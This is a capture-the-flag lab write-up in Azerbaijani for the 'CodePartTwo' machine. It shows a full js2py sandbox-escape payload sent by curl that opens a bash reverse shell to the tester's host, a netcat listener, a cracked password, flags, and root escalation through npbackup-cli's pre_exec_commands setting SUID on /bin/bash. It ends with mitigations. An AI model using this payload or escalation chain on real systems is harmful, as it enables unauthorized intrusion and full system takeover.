# CodePartTwo — Penetrasiya Testi & Exploit Addımı (Markdown sənəd)

> **Qısa xülasə:** bu sənəd `10.10.11.82` hostuna qarşı aparılmış addım-addım penetration testin sənədləşdirilməsidir. Testdə `nmap` skanından başlayaraq veb tətbiq vasitəsilə `js2py` RCE (remote code execution), interaktiv shell, yerli istifadəçi (`marco`) əldə edilməsi və sonradan `sudo` imkanlarından istifadə edib `root` yüksəltməsi izah olunur. **Bu fəaliyyət yalnız müvafiq icazə ilə həyata keçirilmiş test üçündür.**

---

## Məzmun

* [1. Reconnaissance (kəşfiyyat)](#1-reconnaissance-kəşfiyyat)
* [2. Veb tətbiqə giriş və backend kodların incələnməsi](#2-veb-tətbiqə-giriş-və-backend-kodların-incələnməsi)
* [3. `js2py` RCE zəifliyindən istifadə (exploit)](#3-js2py-rce-zəifliyindən-istifadə-exploit)
* [4. Reverse shell əldə edilməsi](#4-reverse-shell-əldə-edilməsi)
* [5. Yerli istifadəçi (`marco`) hesabı və `user.txt`](#5-yerli-istifadəçi-marco-hesabı-və-usertxt)
* [6. `sudo` imkanlarının yoxlanması və `npbackup-cli`-dən yüksəlmə (privilege escalation)](#6-sudo-imkanlarının-yoxlanması-və-npbackup-cli-dən-yüksəlmə-privilege-escalation)
* [7. Root shell və `root.txt`](#7-root-shell-və-roottxt)
* [8. Tövsiyələr / Mitigasiya](#8-tövsiyələr--mitigasiya)
* [9. Bütün istifadə olunmuş əmr və fayllar (qısa)](#9-bütün-istifadə-olunmuş-əmr-və-fayllar-qısa)

---

## 1. Reconnaissance (kəşfiyyat)

İlkin `nmap` skanı:

```bash
nmap -sV 10.10.11.82
```

Nəticə (əsas hissə):

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
8000/tcp open  http    Gunicorn 20.0.4
```

* 8000/tcp üzərində Python (Gunicorn) veb tətbiqi çalışır — veb interfeysə baxmaq və tətbiqin funksionallığını yoxlamaq qərara alındı.

---

## 2. Veb tətbiqə giriş və backend kodların incələnməsi

* Tətbiq interfeysində `Register`/`Login` kimi funksiyalar yoxlandı.
* `Download app` düyməsi vasitəsilə tətbiqin backend kodunu endirildi. Backend kodunda diqqətçəkən hissə:

```python
@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})
```

* Göründüyü kimi, istifadəçi daxil etdiyi JavaScript kodu `js2py.eval_js` vasitəsilə serverdə icra olunur — bu `js2py` kitabxanasının imkanlarından asılı olaraq RCE (remote code execution) üçün zəiflik yarada bilər.
* `requirements.txt`-də `js2py==0.7.4` olduğu aşkarlandı — bunun üçün mövcud exploitlərə baxıldı (public CVE/exploit mövcudluğu araşdırıldı).

> Qeyd: `js2py`-nin bəzi versiyalarında Python obyektlərinə çıxış imkanı yaradaraq subprocess və s. kimi modulları işə salmağa imkan verən zərərli JS payloadları var.

---

## 3. `js2py` RCE zəifliyindən istifadə (exploit)

* Mövcud exploit nümunələrindən ilhamlanaraq öz custom payload yazıldı. Məqsəd `subprocess.Popen` istifadə edib əməliyyat sistemi komandası icra etmək idi.
* İstifadə olunan `curl` POST istəyi (payload JSON olaraq `/run_code` endpointinə göndərilir):

```bash
#!/bin/bash

LHOST="10.10.14.56"
LPORT="4444"

curl -s -X POST -H "Content-Type: application/json" \
-d "{\"code\": \"let cmd = \\\"bash -c 'bash -i >&/dev/tcp/10.10.14.56/4444 0>&1'\\\"; let hacked, bymarve, n11; let getattr, obj; hacked = Object.getOwnPropertyNames({}); bymarve = hacked.__getattribute__; n11 = bymarve(\\\"__getattribute__\\\"); obj = n11(\\\"__class__\\\").__base__; getattr = obj.__getattribute__; function findpopen(o) { let result; for(let i in o.__subclasses__()) { let item = o.__subclasses__()[i]; if(item.__module__ == \\\"subprocess\\\" && item.__name__ == \\\"Popen\\\") { return item; } if(item.__name__ != \\\"type\\\" && (result = findpopen(item))) { return result; } } } n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate(); n11\"}" \
http://10.10.11.82:8000/run_code > /dev/null &
```

* Payload JS vasitəsilə Python obyektlərindən `subprocess.Popen` tapılır və reverse shell üçün `bash -i >&/dev/tcp/...` əmri çalışdırılır.

---

## 4. Reverse shell əldə edilməsi

* Payload göndərilməzdən əvvəl hücumçu maşında `netcat` ilə dinləmə (listener) açıldı:

```bash
nc -lvnp 4444
```

* Payload icra edildikdən sonra target host-dan interaktiv shell əldə edildi. Shell sessiyası tətbiq istifadəçisi (`app` və ya `marco` ola bilər) kontekstində idi — əldə edilən ilkin shell `app` user olaraq başladı və sonra `marco` hesabına keçid edildi (aşağıdakı addımlarda).

---

## 5. Yerli istifadəçi (`marco`) hesabı və `user.txt`

* `/home` direktoriyasına baxıldı:

```bash
cd /home
ls -la
```

* Backend tətbiqin SQLite database-i (`users.db`) tapıldı — içərisində `user` cədvəlində `marco` istifadəçisinin MD5-lə hashlənmiş şifrəsi vardı.
* `sqlite3` ilə DB açılıb istifadəçi məlumatları çıxarıldı:

```sql
sqlite3 users.db
.tables
.schema user
SELECT * from user;
```

* Hash offline olaraq cracking üçün (məs. `john`/`hashcat`) istifadə oluna bilər. (Bu sənəddə cracking prosesinin detallarını göstərmirsiniz; əldə olunan açıq şifrə qeyd edildi.)
* Cracked (tapılmış) parol: `sweetangelbabylove`
* Bu parol ilə SSH daxil olundu:

```bash
ssh marco@10.10.11.82
# password: sweetangelbabylove
```

* `marco` istifadəçisinin `user.txt` faylının məzmunu (submit üçün):
  `07bd85e55c7ff5acdc0af3451a161562`

---

## 6. `sudo` imkanlarının yoxlanması və `npbackup-cli`-dən yüksəlmə (privilege escalation)

* `sudo -l` ilə `marco` istifadəçisinin hansı `sudo` imkanları olduğu yoxlanıldı:

```bash
sudo -l
```

Nəticə nümunəsi:

```
User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

* Yəni `marco` parolsuz olaraq `/usr/local/bin/npbackup-cli` proqramını `sudo` ilə istənilən parametrlə işlədə bilir.
* `npbackup-cli`-nin konfiqurasiya faylı tərkibi incələndi və içində belə bir parametr tapıldı:

```
pre_exec_commands: []
```

* Konfiqurasiya faylı kopyalanıb (`cp npbackup.conf root.conf`) və `pre_exec_commands` bölməsinə zərərli əmri əlavə edildi:

```yaml
pre_exec_commands: ["chmod 4755 /bin/bash"]
```

* `npbackup-cli` bu konfiq faylını oxuyub göstərilmiş `pre_exec_commands`-i `root` kontekstində icra edirsə, `/bin/bash` üçün SUID bitini (`4755`) qoymaq mümkün olur — nəticədə root olaraq SUID shell işə düşə bilər.

* Konfiq faylı ilə birlikdə `npbackup-cli` belə işə salındı:

```bash
sudo /usr/local/bin/npbackup-cli -c root.conf -b
```

* Əmrin uğurla işləməsi nəticəsində `/bin/bash`-in SUID olması təmin edildi:

```bash
ls -la /bin/bash
# -rwsr-xr-x 1 root root ... /bin/bash
```

* Sonra SUID bitli bash `-p` parametrilə işə salındı:

```bash
/bin/bash -p
```

* Bu komanda nəticəsində `root` privileges ilə `root` shell əldə edildi.

---

## 7. Root shell və `root.txt`

* `root` home direktoriyasına baxıldıqdan sonra `root.txt` faylı tapıldı və məzmunu submit olundu:

```
7ee19a338ef796eb192a388c50fa0732
```

---

## 8. Tövsiyələr / Mitigasiya

Bu test nəticəsində aşkar olunan zəifliklər və tövsiyə olunan tədbirlər:

1. **`js2py.eval_js` və digər `eval` istifadəni aradan qaldırın**

   * İstifadəçi girişlərini birbaşa `eval` və ya `exec`-ə ötürmək çox təhlükəlidir. Əgər dinamik kod icrası zərurətdirsə, güvənli sandboxing (izolyasiya) və qəti filtrasiya tətbiq edilməlidir.

2. **Tətbiq serverinin (Gunicorn) üzərində çalışdırılan kodu minimum hüquqlarla idarə edin**

   * Veb proseslər `unprivileged` (məs. `nobody` və ya xüsusi, məhdud bir istifadəçi) altında işləməlidir; bu, hər hansı RCE aşkar ediləndə təsiri məhdudlaşdırır.

3. **Konfiqurasiya fayllarını və `pre_exec` kimi alternativ plug-in imkanlarını güvənli edin**

   * Konfiq fayllarından `root` kontekstində əmrlər icra edilməsinə icazə verilməməlidir; əgər lazımdırsa, girişi məhdudlaşdırın və yalnız whitelist-lənmiş əmrləri çalışdırın.

4. **NOPASSWD ilə verilən `sudo` qaydalarını yoxlayın**

   * `NOPASSWD` ilə verilən icazələr yalnız zəruri olduqda və məhdudlaşdırılmış ekzekutablara tətbiq olunmalıdır. `/usr/local/bin/npbackup-cli` kimi proqramlar `root` kimi əmrlər icra edə bilməməlidir və input valide edilməlidir.

5. **SUID fayllara nəzarət**

   * Sistemdə həddindən artıq SUID faylların olub-olmadığını yoxlayın və şübhəli SUID-ləri təmizləyin.

6. **Parolların hash-lənməsi və qorunması**

   * Hash üçün güclü hashing (bcrypt/scrypt/argon2) istifadə edin, sadə MD5 kimi zəif hashing metodlarından çəkinin.

---

## 9. Bütün istifadə olunmuş əmrlər (qısa siyahı)

Ən əsas əmrlərin xülasəsi:

```bash
# Recon
nmap -sV 10.10.11.82

# RCE endpoint-ə payload göndərmək (misal)
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"code": " ... payload ... "}' \
  http://10.10.11.82:8000/run_code

# Netcat listener
nc -lvnp 4444

# SQLite DB ilə işləmək
sqlite3 users.db
.tables
.schema user
SELECT * FROM user;

# SSH ilə daxil olma
ssh marco@10.10.11.82

# Sudo icazələrini yoxlamaq
sudo -l

# Konfiq faylını kopyalama və dəyişiklik
cp npbackup.conf root.conf
# (edit root.conf -> set pre_exec_commands: ["chmod 4755 /bin/bash"])

# npbackup-cli ilə işə salma (NOPASSWD olduğu üçün parolsuz)
sudo /usr/local/bin/npbackup-cli -c root.conf -b

# SUID bash ilə root shell
/bin/bash -p
```
